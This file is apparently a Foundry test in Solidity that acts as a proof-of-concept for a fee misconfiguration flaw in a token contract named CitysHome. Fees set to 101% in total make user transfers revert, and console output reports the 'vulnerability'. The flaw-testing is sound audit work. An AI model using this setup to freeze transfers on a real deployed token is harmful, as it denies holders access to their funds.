// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CitysHome.sol";

contract CitysHomeTest is Test {
    CitysHome token;
    
    address user = address(0x456);
    address initialSwapAdmin = address(0x123);
    uint256 constant TEST_AMOUNT = 1000 * 10**18;
    address immutable deadWallet = address(0xdead);

    function setUp() public {
        token = new CitysHome();
        
        // Configure base fees
        token.setBurnFee(5);
        token.setSwapFee(5);
        token.setSwapAddress(initialSwapAdmin);

        // Directly transfer from token contract to user using contract impersonation
        vm.prank(address(token));
        token.transfer(user, TEST_AMOUNT);
    }

    function testDeflationaryFeeOverflow() public {
        console.log("--- BEFORE-Trigger Transfer ---");
        uint256 userBalanceBefore = token.balanceOf(user);
        uint256 swapBalanceBefore = token.balanceOf(initialSwapAdmin);
        console.log("User balance before transfer:", userBalanceBefore);
        console.log("Swap admin balance before transfer:", swapBalanceBefore);

        console.log("--- Trigger: Set Fees to 101% total ---");
        // Set fees to 100% burn + 1% liquidity (101% total)
        token.setBurnFee(100);
        token.setSwapFee(1);

        console.log("--- Trigger Transfer Attempt ---");
        // Attempt transfer from user to swapAddress (should revert)
        uint256 userBalanceOnTransfer = token.balanceOf(user);
        
        vm.prank(user);
        vm.expectRevert(); // Expect arithmetic underflow
        token.transfer(initialSwapAdmin, userBalanceOnTransfer);

        console.log("--- AFTER-Trigger Transfer ---");
        uint256 userBalanceAfter = token.balanceOf(user);
        uint256 swapBalanceAfter = token.balanceOf(initialSwapAdmin);
        console.log("User balance after transfer:", userBalanceAfter);
        console.log("Swap admin balance after transfer:", swapBalanceAfter);

        // Verify balances remain unchanged
        bool userBalanceUnchanged = (userBalanceBefore == userBalanceAfter);
        bool swapBalanceUnchanged = (swapBalanceBefore == swapBalanceAfter);
        bool vulnerabilityExists = userBalanceUnchanged && swapBalanceUnchanged;
        
        console.log("=== Vulnerability Verification ===");
        console.log("User balance unchanged:", userBalanceUnchanged ? "Yes" : "No");
        console.log("Swap admin balance unchanged:", swapBalanceUnchanged ? "Yes" : "No");
        console.log("Vulnerability exists:", vulnerabilityExists ? "YES" : "NO");
        
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Fee overflow causes transfer revert and no balance changes");
        } else {
            console.log("Vulnerability not Exist: Unexpected state change after transfer attempt");
        }
    }
}